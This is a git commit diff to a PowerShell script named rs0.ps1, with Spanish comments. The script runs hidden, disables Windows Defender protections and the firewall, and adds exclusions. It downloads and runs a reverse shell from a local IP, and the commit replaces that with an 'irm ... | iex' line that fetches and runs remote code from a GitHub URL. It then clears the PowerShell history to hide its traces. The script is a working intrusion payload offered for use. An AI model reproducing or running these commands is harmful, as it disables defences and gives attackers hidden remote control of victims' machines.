e9ea10f5506bde530c79f3792e5cb727cb92d609
Pancracio <38768857+Chapelo@users.noreply.github.com>
2024-07-06 02:29:23 +0200

    Update rs0.ps1

--- rs0.ps1
+++ rs0.ps1
@@ -3,9 +3,10 @@ PowerShell.exe -WindowStyle hidden {
     # Desactivar Monitorización de Windows Defender (no 100%).
     Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisablePrivacyMode $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -EnableControlledFolderAccess Disabled;
     # Agregar exclusion, desactivar Firewall, descargar y ejecutar shell.
-    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop\" ; netsh advfirewall set allprofiles state off; Invoke-WebRequest -Uri "http://192.168.1.143/reverse.exe" -OutFile "$env:temp\rs.exe"; powershell "$env:temp\rs.exe";
+    # Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop\" ; netsh advfirewall set allprofiles state off; Invoke-WebRequest -Uri "http://192.168.1.143/reverse.exe" -OutFile "$env:temp\rs.exe"; powershell "$env:temp\rs.exe";
+    irm https://raw.githubusercontent.com/Chapelo/rs/main/pw7.ps1 | iex;
     # Eliminar Shell
-    Remove-Item  $env:temp\rs.exe -Force -Recurse;
+    # Remove-Item  $env:temp\rs.exe -Force -Recurse;
     # Limpiar historial de powershell
     [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
     # Limpiar ejecucion de powershell
